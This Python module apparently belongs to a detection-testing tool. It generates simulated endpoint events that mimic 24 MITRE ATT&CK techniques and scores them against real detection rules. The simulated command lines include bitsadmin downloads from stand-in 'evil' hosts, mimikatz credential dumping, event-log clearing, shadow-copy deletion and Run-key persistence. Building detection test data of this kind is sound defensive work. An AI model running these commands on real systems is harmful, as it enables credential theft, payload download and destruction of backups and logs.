"""Digital-twin event simulation.

EVERYTHING HERE IS SIMULATED. Each function models one MITRE ATT&CK
technique's observable footprint in the sensor's raw event schema
(process/network/file/auth dicts, payload stored unwrapped — the same
shape the ingest API writes). The technique IDs are the exact 24 used in
backend/app/ml/threat_data.py; nothing is invented.

These events feed runner.run_sparring, which scores them with the REAL
detection functions. They are never written to the events table and never
become alerts — see models.SIMULATED_MARKER.
"""

from __future__ import annotations

import random
import uuid
from datetime import datetime, timedelta, timezone

from app.sparring.models import SIMULATED_MARKER

# Public, non-reserved example IPs (ipaddress treats TEST-NET ranges as
# reserved, which would silently disable the rare-outbound-port rule).
_PUBLIC_IPS = [
    "45.155.204.10", "185.220.101.5", "103.75.190.44", "91.203.67.22",
    "198.51.44.17", "146.70.99.8", "94.140.120.3", "209.58.180.66",
    "77.83.24.19", "162.33.90.141", "212.102.44.9", "89.45.210.77",
]
_PRIVATE_IPS = ["192.168.1.{}".format(i) for i in range(20, 60)]
_RARE_PORTS = [8443, 8080, 4444, 2121, 5353, 8022, 9001, 7000]


def _utcnow() -> datetime:
    return datetime.now(timezone.utc)


def _window(rng: random.Random, hours: float = 1.5) -> tuple[datetime, datetime]:
    """A 1-2h event window ending now, with jitter."""
    end = _utcnow() - timedelta(minutes=rng.randint(0, 30))
    start = end - timedelta(minutes=int(hours * 60 * rng.uniform(0.8, 1.2)))
    return start, end


def _spread(rng: random.Random, start: datetime, end: datetime, n: int) -> list[datetime]:
    span = (end - start).total_seconds()
    return sorted(start + timedelta(seconds=rng.uniform(0, span)) for _ in range(n))


def _proc(rng: random.Random, ts: datetime, device_id: str, name: str,
          cmdline: list[str], user: str = "SYSTEM") -> dict:
    return {
        "event_type": "process",
        "device_id": device_id,
        "observed_at": ts,
        "payload": {
            "name": name,
            "exe": f"C:\\Windows\\System32\\{name}",
            "pid": rng.randint(1000, 20000),
            "ppid": rng.randint(4, 900),
            "user": user,
            "cmdline": cmdline,
            "hash_sha256": uuid.uuid4().hex + uuid.uuid4().hex[:32],  # 64 hex chars
            SIMULATED_MARKER: True,
        },
    }


def _net(rng: random.Random, ts: datetime, device_id: str, dst_ip: str,
         dst_port: int, process_name: str = "unknown") -> dict:
    return {
        "event_type": "network",
        "device_id": device_id,
        "observed_at": ts,
        "payload": {
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "proto": "tcp",
            "process_name": process_name,
            "pid": rng.randint(1000, 20000),
            SIMULATED_MARKER: True,
        },
    }


def _file(rng: random.Random, ts: datetime, device_id: str, path: str,
          action: str = "created") -> dict:
    return {
        "event_type": "file",
        "device_id": device_id,
        "observed_at": ts,
        "payload": {"path": path, "action": action, SIMULATED_MARKER: True},
    }


def _auth(rng: random.Random, ts: datetime, device_id: str, user: str,
          result: str = "failed") -> dict:
    return {
        "event_type": "auth",
        "device_id": device_id,
        "observed_at": ts,
        "payload": {
            "user": user,
            "result": result,
            "src_ip": rng.choice(_PRIVATE_IPS),
            SIMULATED_MARKER: True,
        },
    }


def _benign_filler(rng: random.Random, device_id: str, times: list[datetime],
                   heavy: bool = False) -> list[dict]:
    """Background normal traffic so the window isn't 100% malicious."""
    evts = []
    procs = ["chrome.exe", "brave.exe", "explorer.exe", "svchost.exe"]
    if heavy:
        procs += ["node.exe", "code.exe"]
    for ts in times:
        if rng.random() < 0.6:
            evts.append(_net(rng, ts, device_id, rng.choice(_PUBLIC_IPS), 443,
                             rng.choice(["chrome.exe", "brave.exe"])))
        else:
            evts.append(_proc(rng, ts, device_id, rng.choice(procs),
                              [rng.choice(procs)], user="ijain"))
    return evts


# ---------------------------------------------------------------------------
# Technique simulators. Each returns 20-60 raw events over a 1-2h window.
# Footprints mirror threat_data.py's observable features honestly:
# techniques with rule-visible artifacts (cmdline patterns, Run keys,
# uncommon ports) should fire rules; stealthy ones lean on the anomaly
# model or evade — the twin measures the engine, quirks included.
# ---------------------------------------------------------------------------

def _t1059_001(rng, device_id, tid):  # PowerShell encoded command
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(6, 10))
    evts = [_proc(rng, t, device_id, "powershell.exe",
                  ["powershell.exe", "-enc", "aGVsbG8gd29ybGQ="]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(14, 30)))
    return evts


def _t1059_003(rng, device_id, tid):  # CMD via living-off-the-land download
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "cmd.exe",
                  ["cmd.exe", "/c", "bitsadmin /transfer dl http://evil/x C:\\x.exe"])
            for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(15, 30)))
    return evts


def _t1053_005(rng, device_id, tid):  # Scheduled task creation
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 6))
    evts = [_proc(rng, t, device_id, "schtasks.exe",
                  ["schtasks.exe", "/create", "/tn", "Updater",
                   "/tr", "C:\\ProgramData\\updater.exe", "/sc", "minute", "/mo", "30"])
            for t in ts]
    evts += [_file(rng, t, device_id, "C:\\ProgramData\\updater.exe") for t in ts[:2]]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(16, 32)))
    return evts


def _t1547_001(rng, device_id, tid):  # Registry Run key persistence
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(3, 5))
    evts = [_file(rng, t, device_id,
                  "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
                  action="created") for t in ts]
    evts += [_proc(rng, t, device_id, "reg.exe",
                   ["reg.exe", "add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v", "OneDriveUpdate", "/d", "C:\\payload.exe"]) for t in ts[:2]]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(18, 34)))
    return evts


def _t1055(rng, device_id, tid):  # Process injection via rundll32 ordinal
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "rundll32.exe",
                  ["rundll32.exe", "C:\\Temp\\evil.dll,DllMain#1"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(15, 30)))
    return evts


def _t1134(rng, device_id, tid):  # Access token manipulation (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "tokensteal.exe",
                  ["tokensteal.exe", "--impersonate", "SYSTEM"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(16, 32)))
    return evts


def _t1027(rng, device_id, tid):  # Obfuscated payload via certutil
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "certutil.exe",
                  ["certutil.exe", "-decode", "C:\\Temp\\a.txt", "C:\\Temp\\b.exe"])
            for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(15, 30)))
    return evts


def _t1070_004(rng, device_id, tid):  # Log clearing (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 6))
    evts = [_proc(rng, t, device_id, "wevtutil.exe",
                  ["wevtutil.exe", "cl", "Security"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(18, 34)))
    return evts


def _t1562_001(rng, device_id, tid):  # Impair defenses: disable recovery
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 6))
    evts = [_proc(rng, t, device_id, "bcdedit.exe",
                  ["bcdedit.exe", "/set", "{current}", "recoveryenabled", "no"])
            for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(18, 34)))
    return evts


def _t1003_001(rng, device_id, tid):  # LSASS memory dumping
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 7))
    evts = [_proc(rng, t, device_id, "mimikatz.exe",
                  ["mimikatz.exe", "sekurlsa::logonpasswords", "exit"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(16, 32)))
    return evts


def _t1110(rng, device_id, tid):  # Brute force: auth failure storm
    s, e = _window(rng, 0.6)
    ts = _spread(rng, s, e, rng.randint(40, 55))
    evts = [_auth(rng, t, device_id, "Administrator", "failed") for t in ts]
    evts += [_auth(rng, t, device_id, "Administrator", "success") for t in ts[:1]]
    return evts


def _t1555(rng, device_id, tid):  # Credentials from password stores (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 6))
    evts = [_file(rng, t, device_id,
                  "C:\\Users\\ijain\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\x\\logins.json",
                  action="modified") for t in ts]
    evts += [_proc(rng, t, device_id, "stealer.exe",
                   ["stealer.exe", "--browser", "firefox"]) for t in ts[:2]]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(16, 30)))
    return evts


def _t1083(rng, device_id, tid):  # File and directory discovery (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "cmd.exe",
                  ["cmd.exe", "/c", "dir", "C:\\", "/s", "/b"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(18, 34)))
    return evts


def _t1057(rng, device_id, tid):  # Process discovery (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(5, 8))
    evts = [_proc(rng, t, device_id, "tasklist.exe",
                  ["tasklist.exe", "/v", "/fo", "csv"]) for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(18, 34)))
    return evts


def _t1018(rng, device_id, tid):  # Remote system discovery: internal fan-out
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(20, 30))
    evts = [_net(rng, t, device_id, ip, 445, "scanner.exe")
            for t, ip in zip(ts, [_PRIVATE_IPS[i % len(_PRIVATE_IPS)] for i in range(len(ts))])]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(10, 20)))
    return evts


def _t1021_001(rng, device_id, tid):  # RDP lateral movement
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(8, 12))
    evts = [_net(rng, t, device_id, rng.choice(_PUBLIC_IPS), 3389, "mstsc.exe")
            for t in ts]
    evts += [_auth(rng, t, device_id, "admin", "failed")
             for t in _spread(rng, s, e, rng.randint(4, 8))]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(10, 20)))
    return evts


def _t1570(rng, device_id, tid):  # Lateral tool transfer over SMB
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(8, 12))
    evts = [_net(rng, t, device_id, rng.choice(_PUBLIC_IPS), 445, "smb.exe")
            for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(12, 24)))
    return evts


def _t1071_001(rng, device_id, tid):  # C2 beaconing over HTTPS (stealthy)
    s, e = _window(rng, 2.0)
    ts = _spread(rng, s, e, rng.randint(20, 40))
    c2 = rng.choice(_PUBLIC_IPS)
    evts = [_net(rng, t, device_id, c2, 443, "svchost.exe") for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(8, 16)))
    return evts


def _t1105(rng, device_id, tid):  # Ingress tool transfer via BITS
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(4, 6))
    evts = [_proc(rng, t, device_id, "bitsadmin.exe",
                  ["bitsadmin.exe", "/transfer", "job1",
                   "http://evil.example/tool.exe", "C:\\Temp\\tool.exe"])
            for t in ts]
    evts += [_net(rng, t, device_id, rng.choice(_PUBLIC_IPS), 80, "bitsadmin.exe")
             for t in ts[:3]]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(14, 28)))
    return evts


def _t1008(rng, device_id, tid):  # Fallback C2 channels on odd ports
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(10, 16))
    evts = [_net(rng, t, device_id, rng.choice(_PUBLIC_IPS),
                 rng.choice(_RARE_PORTS), "updater.exe") for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(12, 24)))
    return evts


def _t1041(rng, device_id, tid):  # Exfiltration over C2 channel (stealthy)
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(15, 25))
    c2 = rng.choice(_PUBLIC_IPS)
    evts = [_net(rng, t, device_id, c2, 443, "backup.exe") for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(10, 20)))
    return evts


def _t1048(rng, device_id, tid):  # Exfiltration over alternative protocol
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(12, 20))
    evts = [_net(rng, t, device_id, rng.choice(_PUBLIC_IPS),
                 rng.choice([2121, 8022, 5353]), "ftp.exe") for t in ts]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(10, 20)))
    return evts


def _t1486(rng, device_id, tid):  # Ransomware: kill backups + mass encrypt
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(3, 5))
    evts = [_proc(rng, t, device_id, "vssadmin.exe",
                  ["vssadmin.exe", "delete", "shadows", "/all", "/quiet"])
            for t in ts]
    fts = _spread(rng, s, e, rng.randint(15, 25))
    evts += [_file(rng, t, device_id,
                   f"C:\\Users\\ijain\\Documents\\doc{i}.docx.locked",
                   action="modified") for i, t in enumerate(fts)]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(8, 16)))
    return evts


def _t1490(rng, device_id, tid):  # Inhibit system recovery
    s, e = _window(rng)
    ts = _spread(rng, s, e, rng.randint(3, 5))
    evts = [_proc(rng, t, device_id, "vssadmin.exe",
                  ["vssadmin.exe", "delete", "shadows", "/all"]) for t in ts]
    evts += [_proc(rng, t, device_id, "bcdedit.exe",
                   ["bcdedit.exe", "/set", "{current}", "recoveryenabled", "no"])
             for t in _spread(rng, s, e, rng.randint(2, 4))]
    evts += _benign_filler(rng, device_id, _spread(rng, s, e, rng.randint(14, 28)))
    return evts


TECHNIQUE_SIMULATORS = {
    "T1059.001": _t1059_001,
    "T1059.003": _t1059_003,
    "T1053.005": _t1053_005,
    "T1547.001": _t1547_001,
    "T1055": _t1055,
    "T1134": _t1134,
    "T1027": _t1027,
    "T1070.004": _t1070_004,
    "T1562.001": _t1562_001,
    "T1003.001": _t1003_001,
    "T1110": _t1110,
    "T1555": _t1555,
    "T1083": _t1083,
    "T1057": _t1057,
    "T1018": _t1018,
    "T1021.001": _t1021_001,
    "T1570": _t1570,
    "T1071.001": _t1071_001,
    "T1105": _t1105,
    "T1008": _t1008,
    "T1041": _t1041,
    "T1048": _t1048,
    "T1486": _t1486,
    "T1490": _t1490,
}

# technique_id -> MITRE tactic (mirrors threat_data.py TECHNIQUES)
TECHNIQUE_TACTICS = {
    "T1059.001": "execution", "T1059.003": "execution",
    "T1053.005": "persistence", "T1547.001": "persistence",
    "T1055": "privilege-escalation", "T1134": "privilege-escalation",
    "T1027": "defense-evasion", "T1070.004": "defense-evasion",
    "T1562.001": "defense-evasion",
    "T1003.001": "credential-access", "T1110": "credential-access",
    "T1555": "credential-access",
    "T1083": "discovery", "T1057": "discovery", "T1018": "discovery",
    "T1021.001": "lateral-movement", "T1570": "lateral-movement",
    "T1071.001": "command-and-control", "T1105": "command-and-control",
    "T1008": "command-and-control",
    "T1041": "exfiltration", "T1048": "exfiltration",
    "T1486": "impact", "T1490": "impact",
}


def _device_id(technique_id: str) -> str:
    return "twin-" + technique_id.replace(".", "-").replace(":", "-")


def simulate_technique(technique_id: str, seed: int | None = None) -> list[dict]:
    """Generate raw simulated events exhibiting a technique's footprint.

    Raises ValueError for unknown technique IDs (never invent one).
    """
    sim = TECHNIQUE_SIMULATORS.get(technique_id)
    if sim is None:
        raise ValueError(f"unknown technique_id for simulation: {technique_id}")
    rng = random.Random(seed)
    return sim(rng, _device_id(technique_id), technique_id)


# ---------------------------------------------------------------------------
# Benign archetypes for false-positive calibration. Template mixes mirror
# the 5 v3 training archetypes (threat_data.py BENIGN_ARCHETYPES).
# ---------------------------------------------------------------------------

_ARCHETYPE_PROCS = {
    "windows-dev": ["chrome.exe", "brave.exe", "node.exe", "code.exe", "powershell.exe"],
    "windows-office": ["outlook.exe", "teams.exe", "excel.exe", "winword.exe", "chrome.exe"],
    "linux-server": ["sshd", "nginx", "cron", "systemd"],
    "macos-laptop": ["Safari", "Xcode", "brew", "Spotify"],
    "overnight-idle": ["svchost.exe", "System"],
}
_ARCHETYPE_PORTS = {
    "windows-dev": [443, 443, 443, 8081, 3128],
    "windows-office": [443, 443, 993, 587],
    "linux-server": [22, 80, 443],
    "macos-laptop": [443, 443, 5223],
    "overnight-idle": [443],
}
BENIGN_ARCHETYPES = list(_ARCHETYPE_PROCS.keys())


def simulate_benign_archetype(name: str, seed: int | None = None) -> list[dict]:
    """Generate benign simulated traffic for one device archetype."""
    if name not in _ARCHETYPE_PROCS:
        raise ValueError(f"unknown benign archetype: {name}")
    rng = random.Random(seed)
    device_id = f"twin-benign-{name}"
    s, e = _window(rng, hours=1.5 if name != "overnight-idle" else 4.0)
    n = rng.randint(5, 8) if name == "overnight-idle" else rng.randint(20, 45)
    ts = _spread(rng, s, e, n)
    procs = _ARCHETYPE_PROCS[name]
    ports = _ARCHETYPE_PORTS[name]
    evts = []
    for t in ts:
        if rng.random() < 0.65:
            pname = rng.choice(procs)
            evts.append(_net(rng, t, device_id, rng.choice(_PUBLIC_IPS),
                             rng.choice(ports), pname))
        else:
            pname = rng.choice(procs)
            evts.append(_proc(rng, t, device_id, pname, [pname], user="user"))
    return evts
